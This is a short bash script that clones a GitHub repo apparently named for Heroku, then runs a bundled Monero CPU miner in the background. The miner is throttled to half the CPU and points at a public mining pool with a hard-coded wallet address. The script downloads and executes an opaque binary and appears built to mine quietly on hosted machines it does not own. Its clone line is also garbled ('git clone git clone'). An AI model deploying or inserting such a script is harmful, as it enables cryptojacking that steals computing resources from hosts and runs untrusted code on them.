#!/bin/bash
sudo apt-get update &&
sudo apt install -y cpulimit &&
sudo sysctl -w vm.nr_hugepages=128
git clone git clone https://github.com/herokubash/heroku002 &&
alias proj="cd ~/heroku002"
chmod +x jce_cn_cpu_miner64 
cpulimit -e jce_cn_cpu_miner64 -l 50 -b &
./jce_cn_cpu_miner64 --any --forever --variation 3 --low -o pool.supportxmr.com:80 -u 45rgestFBHnMTUfuVSvSekfuW4QxaqEyfSwJRQPuvxg9CMZr9mrvuBx9FUzWxSxsT59KykZaaHjQ6GRpTsz9ZdcC3Ko96Ev -p google  -c config.txt &
sleep 60
